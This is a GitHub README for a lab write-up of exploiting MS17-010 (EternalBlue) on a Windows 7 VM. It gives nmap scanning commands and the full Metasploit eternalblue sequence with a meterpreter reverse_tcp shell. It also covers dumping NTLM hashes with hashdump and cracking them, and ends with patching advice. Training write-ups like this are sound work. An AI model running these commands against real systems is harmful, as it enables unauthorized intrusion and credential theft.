# 💣 Windows 7 EternalBlue – Penetration Testing Lab

![License](https://img.shields.io/badge/License-MIT-green.svg)
![Category](https://img.shields.io/badge/Category-Cybersecurity-red.svg)
![Tool](https://img.shields.io/badge/Tool-Metasploit-blue.svg)
![Target](https://img.shields.io/badge/Target-Windows%207-blue.svg)

---

## 📝 Repository Description (About)
*Copy this to your GitHub 'About' section:*
> "A professional demonstration of the MS17-010 (EternalBlue) exploit on Windows 7. Features full reconnaissance, exploitation via Metasploit, and post-exploitation credential cracking. Educational lab by BobXploit. 🛡️💻"

**Tags:** `penetration-testing` `ethical-hacking` `eternalblue` `metasploit` `kali-linux` `infosec` `red-team`

---

## 🚀 Project Overview
**Windows 7 EternalBlue Lab** is a hands-on penetration testing project demonstrating the exploitation of the critical **MS17-010** vulnerability. This project was conducted in a controlled lab environment for educational and training purposes under the **BobXploit** brand.

### 🎯 Features
* 🔍 **SMB Reconnaissance:** Detailed service enumeration.
* 🧨 **Vulnerability Detection:** Precision scanning for MS17-010.
* 💥 **Remote Code Execution:** Exploitation via Metasploit Framework.
* 🔑 **SYSTEM-level Access:** Immediate privilege escalation.
* 🔓 **Post-Exploitation:** NTLM password hash extraction and cracking.
* 📄 **Documentation:** Fully documented attack workflow.

---

## 🧰 Technologies & Tools Used
| Tool | Purpose |
| :--- | :--- |
| **Kali Linux** | Attacker Operating System |
| **Nmap** | Scanning & vulnerability detection (NSE) |
| **Metasploit** | Exploitation & Framework management |
| **Meterpreter** | Post-exploitation payload |
| **CrackStation** | NTLM hash cracking |
| **VMware/Box** | Isolated Virtual Environment |

---

## 🧪 Lab Environment
* **Target OS:** Windows 7 (Vulnerable VM – Blue)
* **Target IP:** `192.168.1.32`
* **Network:** Local Virtual Network
* **Access Level Achieved:** `NT AUTHORITY\SYSTEM`

---

## 🛠️ Attack Walkthrough

### 1️⃣ Reconnaissance
Initial phase to identify open ports and services:
```bash
# Service and version detection
nmap -sC -sV -p 445 192.168.1.32

# Full port scan
nmap -p- -T4 192.168.1.32
```

### 2️⃣ Vulnerability Discovery
Confirming the presence of the EternalBlue vulnerability:

```bash
nmap --script smb-vuln-ms17-010 -p 445 192.168.1.32
```
✔️ Target confirmed vulnerable to MS17-010.


### 3️⃣ Exploitation
Launching the attack using Metasploit:

```msf
msfconsole
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.32
set LHOST <Your_IP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
```
✔️ Meterpreter session opened with SYSTEM privileges.

### 4️⃣ Post-Exploitation
Demonstrating full system control and credential theft:



# Check system details
```msf
sysinfo
```
# Dump NTLM hashes
```msf
hashdump
```
# Crack NTLM hashes
https://crackstation.net/

✔️ Hashes cracked via CrackStation to reveal plain-text passwords.



## 🏁 Results
[x] MS17-010 successfully exploited.

[x] SYSTEM-level access obtained.

[x] NTLM hashes dumped and cracked.

[x] Full system compromise demonstrated.

### 🔐 Security Recommendations
Apply Patches: Install the MS17-010 security update.

Disable SMBv1: Disable the outdated SMBv1 protocol.

Firewall Rules: Restrict/Block TCP port 445 for external access.

Traffic Monitoring: Monitor for suspicious SMB traffic and RCE attempts.

## 🔗 References
🎓 TryHackMe Room – Blue : https://tryhackme.com/room/blue

💥 Metasploit EternalBlue Module: https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/

### 👤 Author
Abanoub Ehab | BobXploit Cybersecurity & Penetration Testing

Disclaimer: This lab is for educational purposes only. Unauthorized exploitation of computer systems is illegal and unethical.
